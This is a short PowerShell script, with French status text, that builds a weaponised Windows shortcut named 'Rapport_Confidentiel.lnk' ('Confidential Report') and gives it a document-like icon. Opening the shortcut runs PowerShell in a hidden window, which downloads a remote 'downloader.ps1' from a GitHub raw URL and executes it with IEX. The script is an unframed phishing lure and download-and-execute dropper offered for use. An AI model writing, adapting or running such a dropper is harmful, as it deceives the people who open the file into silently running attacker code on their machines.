
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$PWD\Rapport_Confidentiel.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = '-nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheikhoudieng/security-certs-updates/main/downloader.ps1')"'
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = "shell32.dll,3"
$Shortcut.Save()
Write-Host "[OK] Raccourci créé : Rapport_Confidentiel.lnk" -ForegroundColor Green
